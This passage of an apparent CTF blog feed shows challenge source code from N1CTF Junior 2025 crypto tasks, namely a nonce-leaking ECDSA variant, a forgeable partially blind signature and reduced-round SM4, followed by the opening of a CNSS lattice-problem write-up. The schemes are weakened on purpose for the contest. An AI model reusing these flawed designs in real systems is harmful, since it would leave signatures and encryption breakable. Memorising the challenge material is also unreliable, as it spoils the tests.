bytes_to_long(ctx + md5(<span class="built_in">str</span>(priv).encode() + msg).digest())</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r = <span class="built_in">int</span>((k * G).x()) % n</span><br><span class="line">    s = (<span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * priv)) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">pub, ctx, msg, sig</span>):</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r, s = sig</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt; r &lt; n <span class="keyword">and</span> <span class="number">0</span> &lt; s &lt; n:</span><br><span class="line">        <span class="keyword">return</span> r == <span class="built_in">int</span>((<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) * (z * G + r * pub)).x()) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>(<span class="params">level, flag</span>):</span><br><span class="line">    priv = randint(<span class="number">1</span>, n - <span class="number">1</span>)</span><br><span class="line">    pub = priv * G</span><br><span class="line">    msg = os.urandom(<span class="number">64</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;=== level <span class="subst">&#123;level&#125;</span> ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(catalan_number(level)):</span><br><span class="line">        ctx = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;context: &#x27;</span>))</span><br><span class="line">        r, s = sign(priv, ctx, msg)</span><br><span class="line">        <span class="keyword">assert</span> verify(pub, ctx, msg, (r, s))</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">1</span>: <span class="built_in">print</span>(<span class="string">&#x27;message:&#x27;</span>, msg.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">2</span>: <span class="built_in">print</span>(<span class="string">&#x27;sign:&#x27;</span>, r)</span><br><span class="line">        <span class="keyword">if</span> level &lt;= <span class="number">3</span>: <span class="built_in">print</span>(<span class="string">&#x27;ature:&#x27;</span>, s)</span><br><span class="line">    </span><br><span class="line">    r, s = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>(<span class="string">&#x27;signature: &#x27;</span>).split())</span><br><span class="line">    <span class="keyword">assert</span> verify(pub, <span class="string">b&#x27;n1junior_2025&#x27;</span>, <span class="string">f&#x27;cat /flag<span class="subst">&#123;level&#125;</span>&#x27;</span>.encode(), (r, s))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;flag<span class="subst">&#123;level&#125;</span>:&#x27;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    chall(<span class="number">1</span>, <span class="string">&quot;💧&quot;</span>)</span><br><span class="line">    chall(<span class="number">2</span>, <span class="string">&quot;🐱&quot;</span>)</span><br><span class="line">    chall(<span class="number">3</span>, FLAG)</span><br></pre></td></tr></table></figure><p>这题<strong>升级</strong>了，在<code>level3</code>中，我们只能得到五次签名验证的<code>s</code><br>后续也需要使用到<code>hashclash</code>了，抽时间再继续学一波吧……</p><h2 id="sign-one-m0re"><a href="#sign-one-m0re" class="headerlink" title="sign one m0re*"></a>sign one m0re*</h2><blockquote><p>Can you break the one-more unforgeability of this signature scheme? 🖊</p><ol><li>Can you break the one-more <strong>unforgeability</strong> of this <strong>provably secure partially blind signature</strong> scheme?</li><li>eROSion</li></ol></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> secp256k1</span><br><span class="line"><span class="keyword">from</span> fastecdsa.point <span class="keyword">import</span> Point</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;**redacted**&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">MAX_SESSIONS = <span class="number">192</span></span><br><span class="line"></span><br><span class="line">p, q, G = secp256k1.p, secp256k1.q, secp256k1.G</span><br><span class="line">info = <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;[N1CTF Junior 2025]&quot;</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">z = Point(info, <span class="built_in">pow</span>(info ** <span class="number">3</span> + <span class="number">7</span>, (p + <span class="number">1</span>) // <span class="number">4</span>, p), secp256k1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Signer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.x = randbelow(q)</span><br><span class="line">        self.y = self.x * G</span><br><span class="line">        self.sessions = &#123;sid: (<span class="number">0</span>, ) <span class="keyword">for</span> sid <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SESSIONS)&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_public_key</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.y</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">commit</span>(<span class="params">self, sid</span>):</span><br><span class="line">        <span class="keyword">assert</span> sid <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SESSIONS), <span class="string">&quot;Invalid session&quot;</span></span><br><span class="line">        <span class="keyword">assert</span> self.sessions[sid][<span class="number">0</span>] == <span class="number">0</span>, <span class="string">&quot;Invalid state&quot;</span></span><br><span class="line">        u, s, d = [randbelow(q) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">        a, b = u * G, s * G + d * z</span><br><span class="line">        self.sessions[sid] = (<span class="number">1</span>, u, s, d)</span><br><span class="line">        <span class="keyword">return</span> a, b</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, sid, e</span>):</span><br><span class="line">        <span class="keyword">assert</span> sid <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SESSIONS), <span class="string">&quot;Invalid session&quot;</span></span><br><span class="line">        <span class="keyword">assert</span> self.sessions[sid][<span class="number">0</span>] == <span class="number">1</span>, <span class="string">&quot;Invalid state&quot;</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="number">1</span> &lt; e &lt; q, <span class="string">&quot;Invalid query&quot;</span></span><br><span class="line">        _, u, s, d = self.sessions[sid]</span><br><span class="line">        c = (e - d) % q</span><br><span class="line">        r = (u - c * self.x) % q</span><br><span class="line">        self.sessions[sid] = (<span class="number">2</span>, )</span><br><span class="line">        <span class="keyword">return</span> r, c, s, d</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Verifier</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.messages = <span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">self, α, β, z, msg</span>):</span><br><span class="line">        to_hash = <span class="string">&quot;||&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, [α.x, α.y, β.x, β.y, z.x, z.y, msg]))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(sha512(to_hash.encode()).digest(), <span class="string">&quot;big&quot;</span>) % q</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, pub, sig, msg</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">all</span>(<span class="number">1</span> &lt; x &lt; q <span class="keyword">for</span> x <span class="keyword">in</span> sig), <span class="string">&quot;Invalid signature&quot;</span></span><br><span class="line">        ρ, ω, σ, δ = sig</span><br><span class="line">        <span class="keyword">if</span> (ω + δ) % q == self.oracle(ρ * G + ω * pub, σ * G + δ * z, z, msg):</span><br><span class="line">            self.messages.add(msg)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(self.messages) == MAX_SESSIONS + <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> FLAG</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Good signature&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad signature&quot;</span></span><br><span class="line"></span><br><span class="line">signal.alarm(<span class="number">300</span>)</span><br><span class="line">signer = Signer()</span><br><span class="line">verifier = Verifier()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd, *args = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).split()</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">&quot;get_key&quot;</span>:</span><br><span class="line">        y = signer.get_public_key()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;y = (<span class="subst">&#123;y.x&#125;</span>, <span class="subst">&#123;y.y&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&quot;commit&quot;</span>:</span><br><span class="line">        sid = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">        a, b = signer.commit(sid)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;a = (<span class="subst">&#123;a.x&#125;</span>, <span class="subst">&#123;a.y&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;b = (<span class="subst">&#123;b.x&#125;</span>, <span class="subst">&#123;b.y&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&quot;sign&quot;</span>:</span><br><span class="line">        sid, e = <span class="built_in">int</span>(args[<span class="number">0</span>]), <span class="built_in">int</span>(args[<span class="number">1</span>])</span><br><span class="line">        r, c, s, d = signer.sign(sid, e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;r = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;s = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;d = &#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&quot;verify&quot;</span>:</span><br><span class="line">        sig, msg = <span class="built_in">tuple</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, args[:<span class="number">4</span>])), args[<span class="number">4</span>]</span><br><span class="line">        <span class="built_in">print</span>(verifier.verify(signer.get_public_key(), sig, msg))</span><br></pre></td></tr></table></figure><h2 id="SM1¼"><a href="#SM1¼" class="headerlink" title="SM1¼*"></a>SM1¼*</h2><blockquote><p>SM4 is a secure block cipher. So is SM1¼. 🔒</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;**redacted**&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">S = (</span><br><span class="line">    <span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x1C</span>, <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">FK = (</span><br><span class="line">    <span class="number">0xA3B1BAC6</span>, <span class="number">0x56AA3350</span>, <span class="number">0x677D9197</span>, <span class="number">0xB27022DC</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">CK = (</span><br><span class="line">    <span class="number">0x00070E15</span>, <span class="number">0x1C232A31</span>, <span class="number">0x383F464D</span>, <span class="number">0x545B6269</span>,</span><br><span class="line">    <span class="number">0x70777E85</span>, <span class="number">0x8C939AA1</span>, <span class="number">0xA8AFB6BD</span>, <span class="number">0xC4CBD2D9</span>,</span><br><span class="line">    <span class="number">0xE0E7EEF5</span>, <span class="number">0xFC030A11</span>, <span class="number">0x181F262D</span>, <span class="number">0x343B4249</span>,</span><br><span class="line">    <span class="number">0x50575E65</span>, <span class="number">0x6C737A81</span>, <span class="number">0x888F969D</span>, <span class="number">0xA4ABB2B9</span>,</span><br><span class="line">    <span class="number">0xC0C7CED5</span>, <span class="number">0xDCE3EAF1</span>, <span class="number">0xF8FF060D</span>, <span class="number">0x141B2229</span>,</span><br><span class="line">    <span class="number">0x30373E45</span>, <span class="number">0x4C535A61</span>, <span class="number">0x686F767D</span>, <span class="number">0x848B9299</span>,</span><br><span class="line">    <span class="number">0xA0A7AEB5</span>, <span class="number">0xBCC3CAD1</span>, <span class="number">0xD8DFE6ED</span>, <span class="number">0xF4FB0209</span>,</span><br><span class="line">    <span class="number">0x10171E25</span>, <span class="number">0x2C333A41</span>, <span class="number">0x484F565D</span>, <span class="number">0x646B7279</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">l2b = <span class="keyword">lambda</span> x: x.to_bytes(<span class="number">4</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">b2l = <span class="keyword">lambda</span> x: <span class="built_in">int</span>.from_bytes(x, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">τ   = <span class="keyword">lambda</span> x: b2l(<span class="built_in">bytes</span>(S[y] <span class="keyword">for</span> y <span class="keyword">in</span> l2b(x)))</span><br><span class="line">rol = <span class="keyword">lambda</span> x, y: ((x &lt;&lt; y) | (x &gt;&gt; (<span class="number">32</span> - y))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">L   = <span class="keyword">lambda</span> x: x ^ rol(x, <span class="number">2</span>) ^ rol(x, <span class="number">10</span>) ^ rol(x, <span class="number">18</span>) ^ rol(x, <span class="number">24</span>)</span><br><span class="line">L_  = <span class="keyword">lambda</span> x: x ^ rol(x, <span class="number">13</span>) ^ rol(x, <span class="number">23</span>)</span><br><span class="line">T   = <span class="keyword">lambda</span> x: L(τ(x))</span><br><span class="line">T_  = <span class="keyword">lambda</span> x: L_(τ(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_block</span>(<span class="params">key, block, nr=<span class="number">32</span></span>):</span><br><span class="line">    K = [b2l(key[i : i + <span class="number">4</span>]) ^ FK[i // <span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line">    X = [b2l(block[i : i + <span class="number">4</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nr):</span><br><span class="line">        K += [K[i] ^ T_(CK[i] ^ K[i + <span class="number">1</span>] ^ K[i + <span class="number">2</span>] ^ K[i + <span class="number">3</span>])]</span><br><span class="line">        X += [X[i] ^ T(X[i + <span class="number">1</span>] ^ X[i + <span class="number">2</span>] ^ X[i + <span class="number">3</span>] ^ K[i + <span class="number">4</span>])]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(l2b(X[nr + <span class="number">3</span> - i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">key, pt, nr=<span class="number">32</span></span>):</span><br><span class="line">    pt = pad(pt, <span class="number">16</span>)</span><br><span class="line">    ct = <span class="built_in">bytes</span>(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">16</span>):</span><br><span class="line">        ct += enc_block(key, strxor(pt[i : i + <span class="number">16</span>], ct[-<span class="number">16</span> : ]), nr)</span><br><span class="line">    <span class="keyword">return</span> ct[<span class="number">16</span> : ]</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(enc(key, FLAG.encode()).<span class="built_in">hex</span>())</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pt = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(enc(key, pt, <span class="number">10</span>).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;还是太难了QWQ，等补档了……&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;wp参考&lt;br&gt;&lt;a href=&quot;https://c1oudfl0w0.github.io/blog/2025/09/13/N1CTF-Junior-2025-2-2&quot;&gt;https://c1oudfl0</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CNSS-Summer2025-Crypto-WriteUp</title>
    <link href="https://hvang10.github.io/2025/08/26/CNSS-Summer2025-Crypto-WriteUp/"/>
    <id>https://hvang10.github.io/2025/08/26/CNSS-Summer2025-Crypto-WriteUp/</id>
    <published>2025-08-25T17:56:23.000Z</published>
    <updated>2025-10-08T15:32:47.904Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>原来是这样，去年招新赛的题放到了<code>summer</code>，那新生就惨喽<br><img src="https://pic1.zhimg.com/80/v2-ef479dc976e8fcf11df6c18fd79be748_1440w.png" alt=""></p><h2 id="task1-😴-苦昼短"><a href="#task1-😴-苦昼短" class="headerlink" title="task1(😴 苦昼短)"></a>task1(😴 苦昼短)</h2><p>见<a href="https://hvang10.github.io/2024/10/10/cnss-recruit-2024">cnss-recruit-2024😴 苦昼短</a></p><h2 id="O…OFB-🐬-詩超絆"><a href="#O…OFB-🐬-詩超絆" class="headerlink" title="O…OFB ?(🐬 詩超絆)"></a>O…OFB ?(🐬 詩超絆)</h2><p>见<a href="https://hvang10.github.io/2024/10/10/cnss-recruit-2024">cnss-recruit-2024🐬 詩超絆</a></p><h2 id="线…线性规划？-😭-声声慢"><a href="#线…线性规划？-😭-声声慢" class="headerlink" title="线…线性规划？(😭 声声慢)"></a>线…线性规划？(😭 声声慢)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">nbits = <span class="number">640</span></span><br><span class="line">n = getRandomNBitInteger(nbits)</span><br><span class="line">s = <span class="number">0</span></span><br><span class="line">a = []</span><br><span class="line">x = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ai = getRandomNBitInteger(nbits)</span><br><span class="line">    xi = getRandomNBitInteger(<span class="number">64</span> + <span class="number">32</span> * i)</span><br><span class="line">    a.append(ai)</span><br><span class="line">    x.append(xi)</span><br><span class="line">    s += ai * xi</span><br><span class="line"></span><br><span class="line">k = s//n</span><br><span class="line">s %= n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;s = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a = &#125;</span>&quot;</span>)</span><br><span class="line">flag = <span class="string">&#x27;cnss&#123;&#x27;</span>+<span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> x])+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 3904064643893390361433617712655100029912556632089667501554029429639468928393101622043906144668453264281530453865022580589294831765389441377916901119131234356458963290551834945708721353433505601</span></span><br><span class="line"><span class="string">s = 3604875074795055000123916123224108624958126368977597327049275476975598192797160984462664525867166641119496011661706120902314295453633878065433943707394662052729528152546793152201914658255139867</span></span><br><span class="line"><span class="string">a = [2730885493586765190463536251928549081027650544135162075248013764093382819365134392595553863394291517552006396494131206919459935145536152218329288354821904074559120766005594153544756912098945832, 2682794543299249423965520585343408877939482776908813108080125635950617712534116358263875473393216488846715164240099514620137387390122653676168840502450478268278599148289754303414710910342195076, 3056310241622299025529837725147575615329254835813066425883457571781120647010672396603486688297231719653298145480220955878347533091003144227093892753771160874705140077267221046644815086744932854, 4118287861218613731723595777607376442710273799564235506091542746021449841390393039734820750495517116647742753148077759431161482333337542591059373997816043305851015242515503798301490457740269149]</span></span><br><span class="line"><span class="string">flag = cnss&#123;***&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>说实话，这题的<strong>格</strong>很好构造，一目了然</p><script type="math/tex; mode=display">\left [ \begin{matrix}k&x_{0}&x_{1}&x_{2}&x_{3}\\\end{matrix} \right ]*\left [ \begin{matrix}-n&0&0&0&0\\a_{0}&1&0&0&0\\a_{1}&0&1&0&0\\a_{2}&0&0&1&0\\a_{3}&0&0&0&1\\\end{matrix} \right ]\ =\left [ \begin{matrix}s&x_{0}&x_{1}&x_{2}&x_{3}\end{matrix} \right ]</script><p>这里我还没<strong>未配平</strong>，然而就算配平(目标向量平衡在<code>160bits</code>)之后，<strong>LLL</strong>规约出来的目标向量第一个居然是<code>n</code>？？？wtf</p><p>不理解，然后拷打<code>GPT</code>一番，发现它更是一坨，感觉根本不懂什么是配平，当然代码依旧一坨</p><p>随之转战<strong>Gemini 